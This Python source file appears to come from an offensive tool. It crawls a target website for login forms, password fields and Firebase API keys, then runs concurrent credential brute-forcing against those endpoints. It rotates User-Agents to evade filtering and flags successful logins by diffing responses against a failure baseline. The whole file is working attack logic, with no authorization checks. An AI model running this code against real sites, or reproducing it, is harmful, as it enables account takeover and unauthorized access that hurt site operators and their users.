"""
WebAuth Core Engine - Discovery & Brute Force Logic.
"""

import asyncio
import aiohttp
import urllib.parse
import re
import random
import logging
from typing import List, Dict, Optional, Set, Any, Tuple
from difflib import SequenceMatcher
from .models import AuthEndpoint, AuthBaseline

# Configure basic logging for the engine
logger = logging.getLogger(__name__)

# Improved Parsing with BeautifulSoup
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    logger.warning("BeautifulSoup4 not installed. HTML parsing capabilities will be limited.")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

def get_random_ua() -> str:
    """Returns a randomized User-Agent string to evade basic filtering."""
    return random.choice(USER_AGENTS)

class DiscoveryEngine:
    """
    Asynchronous BFS Crawler for identifying authentication entry points.
    
    This engine maps out the attack surface by identifying standard HTML forms,
    Single-Page Application (SPA) components, and hidden API configurations.
    """
    def __init__(self, session: aiohttp.ClientSession, target: str, max_pages: int = 50, proxy: Optional[str] = None):
        self.session = session
        self.target = target
        self.max_pages = max_pages
        self.proxy = proxy
        self.visited: Set[str] = set()
        self.endpoints: List[AuthEndpoint] = []
        self.queue: asyncio.Queue = asyncio.Queue()

    async def run(self) -> List[AuthEndpoint]:
        """
        Initiates the concurrent discovery process using a worker pool.
        
        Returns:
            List[AuthEndpoint]: A list of discovered authentication gateways.
        """
        await self.queue.put(self.target)
        
        # Create a pool of concurrent workers
        workers = [asyncio.create_task(self._worker()) for _ in range(5)]
        
        try:
            # Wait for the queue to be fully processed, with a safety timeout
            await asyncio.wait_for(self.queue.join(), timeout=300)
        except asyncio.TimeoutError:
            logger.warning("Discovery engine timed out after 300 seconds.")
        finally:
            # Clean up worker tasks
            for w in workers:
                w.cancel()
                
        return self.endpoints

    def _is_internal(self, url: str) -> bool:
        """Determines if a given URL belongs to the target domain."""
        try:
            target_netloc = urllib.parse.urlparse(self.target).netloc
            url_netloc = urllib.parse.urlparse(url).netloc
            return target_netloc == url_netloc
        except Exception:
            return False

    async def _worker(self):
        """Asynchronous worker that processes URLs from the queue."""
        while True:
            url = await self.queue.get()
            try:
                # Normalize URL to prevent duplicate crawling
                url = url.split("#")[0].rstrip("/")
                
                if url in self.visited or len(self.visited) >= self.max_pages or not url.startswith("http"):
                    continue
                    
                self.visited.add(url)
                
                headers = {'User-Agent': get_random_ua()}
                async with self.session.get(url, headers=headers, proxy=self.proxy, timeout=10) as resp:
                    if resp.status != 200:
                        continue
                        
                    body = await resp.text(errors='ignore')
                    content_type = resp.headers.get("Content-Type", "").lower()
                    
                    if HAS_BS4 and "text/html" in content_type:
                        await self._extract_bs4(body, url)
                        await self._find_links(body, url)
                    
                    # Heuristic: Identify Firebase configuration in JavaScript or HTML
                    if "application/javascript" in content_type or url.endswith(".js") or "text/html" in content_type:
                        if 'apiKey' in body and 'authDomain' in body:
                            self._extract_firebase(body, url)
                            
            except Exception as e:
                logger.debug(f"Error crawling {url}: {e}")
            finally:
                self.queue.task_done()

    async def _find_links(self, html: str, source: str):
        """Extracts standard links and scripts for recursive crawling."""
        if not HAS_BS4:
            return
            
        soup = BeautifulSoup(html, 'html.parser')
        
        # 1. Standard Hyperlinks
        for link in soup.find_all('a', href=True):
            n = urllib.parse.urljoin(source, link.get('href'))
            if self._is_internal(n):
                await self.queue.put(n)
                
        # 2. External Script Files (Deep Crawl)
        for script in soup.find_all('script', src=True):
            n = urllib.parse.urljoin(source, script.get('src'))
            if self._is_internal(n):
                await self.queue.put(n)

    async def _extract_bs4(self, html: str, source: str):
        """Analyzes HTML structure to identify login forms and naked inputs."""
        soup = BeautifulSoup(html, 'html.parser')
        
        # 1. Aggressive Form Discovery (Standard & SPA)
        forms = soup.find_all('form')
        
        # Heuristic: If no explicit <form> exists, look for containers with password fields
        if not forms:
            wrappers = soup.find_all(['div', 'section', 'main'])
            for wrap in wrappers:
                if wrap.find('input', {'type': 'password'}):
                    forms.append(wrap)

        for form in forms:
            action = urllib.parse.urljoin(source, form.get('action') or source)
            method = (form.get('method') or 'POST').upper()
            
            u_field, p_field = None, None
            inputs: Dict[str, str] = {}
            
            # Extract all interactive elements
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name') or inp.get('id')
                if not name: 
                    continue
                
                itype = (inp.get('type') or 'text').lower()
                
                # Logic: Identify Password Field
                if itype == "password" or "pass" in name.lower() or "pwd" in name.lower():
                    p_field = name
                # Logic: Identify Username/Email Field
                elif any(x in name.lower() for x in ["user", "email", "login", "id"]):
                    u_field = name
                
                inputs[name] = inp.get('value') or ''

            # Register endpoint if a credential pair is identified
            if u_field and p_field:
                auth_type = 'universal_json' if form.name != 'form' else 'form_urlencoded'
                extra_data = {k: v for k, v in inputs.items() if k not in [u_field, p_field]}
                self._add_ep(action, auth_type, method, u_field, p_field, extra_data, source)

        # 2. Universal Page Search (Global Catch-all for "naked" inputs)
        all_pwd = soup.find_all('input', {'type': 'password'})
        for p_inp in all_pwd:
            p_name = p_inp.get('name') or p_inp.get('id')
            if not p_name: continue
            
            # Look for the nearest text/email input preceding the password field
            prev_inputs = p_inp.find_all_previous('input', limit=5)
            for u_inp in prev_inputs:
                u_name = u_inp.get('name') or u_inp.get('id')
                if not u_name: continue
                
                if any(x in u_name.lower() for x in ["user", "email", "login", "id"]):
                    self._add_ep(source, 'universal_json', 'POST', u_name, p_name, {}, source)
                    break

    def _extract_firebase(self, body: str, source: str):
        """Identifies Firebase API keys and constructs the Identity Toolkit URL."""
        api_key_m = re.search(r'apiKey\s*:\s*["\']([^"\']+)["\']', body)
        if api_key_m:
            firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key_m.group(1)}"
            self._add_ep(firebase_url, 'universal_json', 'POST', 'email', 'password', {"returnSecureToken": True}, source)

    def _add_ep(self, url: str, auth_type: str, method: str, u: str, p: str, extra: Dict[str, Any], source: str):
        """Registers a newly discovered authentication endpoint, avoiding duplicates."""
        ep = AuthEndpoint(url, auth_type, method, u, p, extra, source)
        if not any(e.url == ep.url for e in self.endpoints):
            self.endpoints.append(ep)


class BruteEngine:
    """
    Intelligence-driven Authentication Tester.
    
    Implements high-concurrency testing with fuzzy-logic detection, bypassing
    traditional status-code reliance by comparing responses to a known failure baseline.
    """
    def __init__(self, session: aiohttp.ClientSession, concurrency: int = 10, proxy: Optional[str] = None):
        self.session = session
        self.sem = asyncio.Semaphore(concurrency)
        self.proxy = proxy
        self.baselines: Dict[str, AuthBaseline] = {}
        self.results: List[Tuple[str, str, str]] = []
        self.rate_limited = False

    async def capture_baseline(self, ep: AuthEndpoint):
        """
        Establishes the failure signature for an endpoint to perform differential analysis.
        """
        try:
            payload = {ep.username_field: 'invalid_user', ep.password_field: 'invalid_pass', **ep.extra_fields}
            
            # Format payload based on endpoint type (Crucial for modern APIs like Firebase)
            post_kwargs = {'json': payload} if ep.auth_type == 'universal_json' else {'data': payload}
            
            async with self.session.post(ep.url, **post_kwargs, proxy=self.proxy, timeout=10) as resp:
                body = (await resp.text(errors='ignore')).lower()
                self.baselines[ep.url] = AuthBaseline(resp.status, len(body), body[:2000])
        except Exception as e:
            logger.debug(f"Failed to capture baseline for {ep.url}: {e}")

    async def test(self, ep: AuthEndpoint, u: str, p: str):
        """
        Executes a single credential validation attempt using differential response modeling.
        """
        if self.rate_limited:
            return
            
        async with self.sem:
            try:
                payload = {ep.username_field: u, ep.password_field: p, **ep.extra_fields}
                post_kwargs = {'json': payload} if ep.auth_type == 'universal_json' else {'data': payload}
                
                async with self.session.post(ep.url, **post_kwargs, proxy=self.proxy, allow_redirects=False, timeout=10) as resp:
                    if resp.status in [429, 403]:
                        self.rate_limited = True
                        return
                        
                    body = (await resp.text(errors='ignore')).lower()
                    base = self.baselines.get(ep.url)
                    
                    if not base:
                        return
                        
                    # Logic 1: Status Code Differential (e.g., 200 changes to 302 on success)
                    if resp.status != base.failed_status and resp.status in [200, 301, 302]:
                        self.results.append((ep.url, u, p))
                    # Logic 2: Fuzzy Logic Pattern Matching (Gestalt Algorithm)
                    elif SequenceMatcher(None, body[:2000], base.failed_body_sample).ratio() < 0.8:
                        # Ensure no common error keywords are present
                        if not any(x in body for x in ["invalid", "incorrect", "fail", "wrong"]):
                            self.results.append((ep.url, u, p))
                            
            except asyncio.TimeoutError:
                pass
            except Exception as e:
                logger.debug(f"Error testing {u}:{p} on {ep.url}: {e}")
